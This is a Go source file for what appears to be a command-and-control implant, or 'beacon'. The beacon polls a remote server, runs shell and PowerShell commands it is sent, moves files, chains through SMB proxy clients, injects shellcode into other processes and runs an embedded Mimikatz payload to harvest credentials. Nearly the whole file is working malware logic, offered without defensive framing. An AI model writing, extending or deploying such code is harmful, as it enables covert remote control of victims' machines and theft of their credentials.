package main

import (
	"os"
	"fmt"
	"time"
	"bufio"
	"os/exec"
	"strings"
	"strconv"
	"context"
	"runtime"
	"os/user"
	"net/http"
	"encoding/hex"
	"encoding/json"
	b64 "encoding/base64"
	ps "github.com/mitchellh/go-ps"
	"github.com/thecodeteam/goodbye"
)

type Beacon struct {
	Ip string
	Id string
	ProxyClients []string
	ExecBuffer []string
	DownloadBuffer []string
	UploadBuffer []string
	ShellcodeBuffer []string
	LastSeen time.Time 	
}

var msPerUpdate int = 3000
var cmdProxyIp string
var cmdProxyId string
var cmdAddress string
var cmdPort string
var cmdHost string
var secret string
var id string
var ip string
var pid string
var pipeName string
var pname string
var queryData string
var debug bool = false
var curUser string
var platform string
var arch string
var securityContext BeaconSecurityContext
var msgBuffer []string
var beaconSmbClients []BeaconSmbClient
var beaconHttp *BeaconHttp
var netClient = &http.Client{
	Timeout: time.Second * 10,
}

func handleQueryResponse(encData []byte) {
	data := encData//securityContext.decrypt(encData) // TODO : FIX THIS
	var beaconMsgs []BeaconMessage
	json.Unmarshal(data, &beaconMsgs)

	for _, beaconMsg := range beaconMsgs {
		var commResp CommandResponse

		// get data for proxy beacon via proxyClients
		json.Unmarshal(beaconMsg.Data, &commResp)

		if len(beaconMsg.Route) > 0 {
			json.Unmarshal([]byte(beaconMsg.Data), &commResp)
			if beaconMsg.Route[0] == 0 {
				useCommResp(commResp, beaconHttp)
			} else {
				for _, smbClient := range beaconSmbClients {
					if smbClient.beacon.Id == string(beaconMsg.Route) {
						smbClient.command(beaconMsg.Data)
					}
				}
			}
		}
	}
}

func useCommResp(commResp CommandResponse, packet Request) {
	for i := 0; i < len(commResp.Shellcode); i += 2 {
		var output string
		procId := -1
		shellcode := commResp.Shellcode[i]
		procInfo := strings.Split(commResp.Shellcode[i+1], " ")
		
		if procInfo[0] != "module" {
			procId, _ = strconv.Atoi(procInfo[1])
		}
		
		decodedShellcode, err := b64.StdEncoding.DecodeString(shellcode)

		if err != nil {
			debugFatal(err)
			continue
		}

		if procInfo[0] != "module" {
			si := RemoteShellcodeInjector { decodedShellcode, procId }
			err := si.inject()
			if err != nil {
				output = err.Error()
			} else {
				output = ""
			}
		} else {
			si := RemotePipedShellcodeInjector { decodedShellcode, strings.Join(procInfo[1:], " ") }
			output = si.inject()
		}
		
		var data []byte
				
		if procInfo[0] == "migrate" {
			var msg string
			if err == nil || err.Error() == "The operation completed successfully." {
				msg = "Success"
				defer packet.exitHandler()
			} else {
				msg = err.Error()
			}

			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"migrate",[]byte(msg)})
		} else if procInfo[0] == "module" {
			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
		} else {
			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
		}

		debugFatal(err)
	 	encoded := b64.StdEncoding.EncodeToString(data)
		queryCommandHttp(encoded)
	
	}

	for _, file := range commResp.Download {
		packet.upload(file)
	}

	for _, file := range commResp.Upload {
		packet.download(file)
	}

	for _, client := range commResp.ProxyClients {
		var beacon Beacon
		json.Unmarshal([]byte(client), &beacon)
		fmt.Println("Adding proxy " + beacon.Id)
		packet.addProxyClient(beacon)
	}

	for _, cmd := range commResp.Exec {
		cmdSplit := strings.Fields(cmd);
		output := []byte{}
		
		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
			packet.exitHandler()
		}

		if cmdSplit[0] == "mimikatz" {
			data, _ := hex.DecodeString(mimikatzShellcode)
			injector := RemotePipedShellcodeInjector { 
				shellcode: data,
				args: strings.Join(append(cmdSplit[0:], "exit"), " "),
			}

			out := injector.inject()
			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"mimikatz",[]byte(out)})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
			return
		}

		if cmdSplit[0] == "plist" {
			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
			procList, _ := ps.Processes()
			
			for _, p := range procList {
				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
			}

			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"plist",[]byte(procs)})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
			return
		}
		
		var cmdHandle *exec.Cmd

		if runtime.GOOS == "linux" {
			command := []string{ "-c", cmd }
			cmdHandle = exec.Command("/bin/sh", command...)
		} else if runtime.GOOS == "windows" {
			command := []string { "-c", cmd }
			cmdHandle = exec.Command("powershell", command...)
		}

		stderr, err := cmdHandle.StderrPipe()
		stdout, err := cmdHandle.StdoutPipe()
		
		if err = cmdHandle.Start(); err == nil {
			scanner := bufio.NewScanner(stderr)
			
			if err != nil {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			for scanner.Scan() {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			scanner = bufio.NewScanner(stdout)
			
			if err != nil {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			for scanner.Scan() {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}
		}
		
		if len(output) > 0 {
			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"exec",output})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
		}
	}
}

func main() {
	securityContext := newBeaconSecurityContext()
	securityContext.key = []byte(secret)

	user, _ := user.Current()
	curUser = user.Username
	platform = runtime.GOOS
	arch = runtime.GOARCH
	pid = strconv.Itoa(os.Getpid())
	p, e := ps.FindProcess(os.Getpid())

	fmt.Println(id + " " + platform + "/" + arch)
	fmt.Println(pid + " : " + p.Executable())
	fmt.Println(e)
	
	lhost, err := externalIP()
	debugFatal(err)
	ip = lhost
	jsonData, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,p.Executable(),"",nil})
	debugFatal(err)
	
	if cmdProxyIp == "" {
		var encoder = Base64Encoder {
			data: jsonData,
		}
		
		beaconHttp = &BeaconHttp {
			method: "GET",
			data: encoder.scramble(),
		}

		ctx := context.Background()
		defer goodbye.Exit(ctx, -1)
		goodbye.Notify(ctx)
		goodbye.Register(func(ctx context.Context, sig os.Signal) {
			beaconHttp.exitHandler()
		})

		for range time.Tick(time.Millisecond * time.Duration(msPerUpdate)) {
			go func() {
				beaconHttp.queryServer()
			}()
		}
 	} else {
		var encoder = Base64Encoder {
			data: securityContext.encrypt(jsonData),
		}
		
		handler := BeaconSmbServer { data: encoder.scramble(), initialized: false }
		handler.start()
	}
}